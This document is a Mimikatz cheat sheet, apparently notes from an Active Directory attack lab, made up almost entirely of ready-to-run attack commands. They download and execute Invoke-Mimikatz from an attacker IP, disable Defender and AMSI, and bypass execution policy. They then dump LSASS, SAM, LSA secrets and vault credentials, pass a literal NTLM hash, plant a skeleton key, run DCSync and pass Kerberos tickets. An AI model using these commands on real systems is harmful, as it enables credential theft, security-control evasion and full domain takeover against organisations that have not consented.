# Mimikatz

Invoke-Mimikatz commands:

 - Upload Mimikatz from attacker machine, then run via PSRemoting (requires local admin) and dump the hashes
```
iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
# Disable AMSI
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

 - Over Pass the Hash using an NTLM hash (run from elevated PowerShell)
```
# Disable AV
Set-MpPreference -DisableRealtimeMonitoring $true
# Bypass EP
powershell -ep bypass
# Load Mimikatz
. .\Invoke-Mimikatz.ps1
# Over pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
# Check privileges
ls \\$domaincontroller\c$
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName $dc
```

- Interesting credentials such as those set for Scheduled Tasks are stored in the Credential Vault. These can be extracted using:
`Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'`
 - Dump hashes on target machines
`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <targetserver>`
 - Skeleton Key
`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
 - Dump hashes from SAM database (local users)
`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`

These are currently directly lifted from https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#powershell-remoting
I will add and edit as this cheatsheet progresses.

```
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```